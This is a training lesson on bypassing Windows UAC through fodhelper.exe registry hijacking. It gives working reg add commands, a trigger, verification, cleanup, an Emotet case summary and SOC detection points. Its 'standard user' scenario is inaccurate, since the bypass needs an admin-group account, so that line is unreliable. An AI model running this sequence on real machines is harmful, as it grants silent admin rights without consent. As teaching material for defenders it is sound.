# Day 70 — UAC Bypass

**Volume:** 02 — Operating Systems Deep Dive
**Topic:** 7 — Windows Permissions and Access Control
**Subtopic:** How Attackers Bypass UAC (Windows 10 VM Only)

---

## What It Is

UAC (User Account Control) is Windows' security checkpoint. Even if you are logged in as an Administrator, Windows does not give every program full admin power automatically. When a program needs admin-level power, Windows shows a popup — "Do you want to allow this app to make changes?" — you click Yes or No.

Some programs are allowed to silently get admin power without showing that popup. Attackers find those trusted programs and use them as a ladder to quietly elevate their own malicious code to admin level — without you ever seeing a popup. This is called a UAC bypass.

---

## Key Terms

**UAC (User Account Control)** — Windows security feature that forces programs to ask for permission before running with admin privileges, even if the logged-in user is an admin.

**Privilege** — the level of power a program or user has. Low privilege = limited access. High privilege (admin) = can change system settings, install software, modify registry.

**Integrity Level** — Windows assigns every process a label: Low, Medium, High, or System.
- Normal programs run at Medium
- Admin programs run at High
- UAC is the gate between Medium and High

**Auto-elevation** — some Windows built-in programs are marked by Microsoft as trusted enough to jump from Medium to High integrity without showing a UAC popup. Examples: `fodhelper.exe`, `eventvwr.exe`, `computerdefaults.exe`.

**Registry hijacking** — these auto-elevating programs look up a registry key before they run. If that key does not exist in HKCU, Windows lets the user create it. An attacker writes a malicious command into that key. When the trusted program runs and checks the key, it executes the attacker's command at High integrity — no popup.

**HKCU** — HKEY_CURRENT_USER — the registry hive that belongs to the current logged-in user. Normal users can write here without admin permission. This is the attack surface.

**Shell\Open\Command** — a registry path pattern that tells Windows: when this file type is opened, run this command. Attackers plant their own command here.

---

## How the Bypass Works

Windows has a list of built-in executables marked `autoElevate: true` inside their application manifest (a small XML file embedded in the `.exe`). When these programs launch, Windows automatically elevates them to High integrity without a UAC prompt.

`fodhelper.exe` is one of them — a legitimate Windows program that manages optional features. Before it opens, it checks this registry path:

HKCU\Software\Classes\ms-settings\Shell\Open\Command

Normally this key does not exist in HKCU. But if an attacker creates this key and puts a command inside it — `fodhelper.exe` runs that command at High integrity with no popup shown.

This works because:
- HKCU is writable by any normal user — no admin needed to create keys here
- `fodhelper.exe` is trusted by Windows — it gets auto-elevated
- `fodhelper.exe` reads the attacker's key and executes whatever command is there at admin level

---

## Real Practical Example (Windows 10 VM)

**Scenario:** Logged in as standard user. Goal: open High-integrity CMD without triggering UAC popup.

### Phase 1 — Check Current Integrity Level

```cmd
whoami /groups | findstr "Mandatory Label"
```

- `whoami` — prints info about the currently logged-in user
- `/groups` — shows all groups and integrity labels assigned to your current process
- `|` — pipe — takes output of `whoami /groups` and feeds it into the next command
- `findstr` — Windows version of grep — searches text for a matching pattern
- `"Mandatory Label"` — the string we are searching for

Result: `Mandatory Label\Medium Mandatory Level` — normal user level.

### Phase 2 — Plant the Registry Key

```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\Command" /f
```

- `reg` — Windows command-line tool for reading and writing registry entries
- `add` — creates a new key or value
- `"HKCU\Software\Classes\ms-settings\Shell\Open\Command"` — the exact path `fodhelper.exe` checks when it launches
- `/f` — force — creates without asking for confirmation

```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\Command" /ve /d "cmd.exe" /f
```

- `/ve` — sets the default value of this key
- `/d "cmd.exe"` — the command that will execute when `fodhelper.exe` reads this key
- `/f` — force, no confirmation

```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\Command" /v "DelegateExecute" /d "" /f
```

- `/v "DelegateExecute"` — adds a value named DelegateExecute inside the same key
- `/d ""` — sets its data to empty string
- `fodhelper.exe` checks for this value — without it the bypass does not trigger

### Phase 3 — Trigger the Bypass

```cmd
fodhelper.exe
```

- `fodhelper.exe` launches — Windows auto-elevates it to High integrity — no UAC popup
- It reads the planted key — executes `cmd.exe`
- New CMD window opens at High integrity

### Phase 4 — Verify High Integrity

In the new CMD window:

```cmd
whoami /groups | findstr "Mandatory Label"
```

Result: `Mandatory Label\High Mandatory Level` — admin level reached from Medium process. Zero popups.

### Phase 5 — Clean Up (Mandatory)

```cmd
reg delete "HKCU\Software\Classes\ms-settings" /f
```

- `reg delete` — removes a registry key
- `"HKCU\Software\Classes\ms-settings"` — parent key we created — deleting this removes everything planted underneath
- `/f` — force delete without confirmation

---

## Security Angle — Real Breach

**Emotet malware — 2019 to 2021**

Emotet used `fodhelper.exe` UAC bypass after initial phishing infection to silently elevate privileges. Once at High integrity it disabled Windows Defender, installed banking trojans, and spread laterally across corporate networks. Taken down by FBI and Europol in January 2021 after an estimated $2.5 billion in global damages.

**What failed:**
- Users running as local admins — least privilege not enforced
- UAC set to default level, not maximum
- No EDR monitoring registry writes to HKCU persistence paths

**What SOC analysts watch for:**
- Registry writes to `HKCU\Software\Classes\ms-settings\Shell\Open\Command`
- `fodhelper.exe` spawning unexpected child processes like cmd.exe or powershell.exe
- A Medium integrity process spawning a High integrity child without a UAC prompt

> Sigma rules — a vendor-neutral format for writing detection logic that converts to any SIEM query language — covered fully in Volume 6.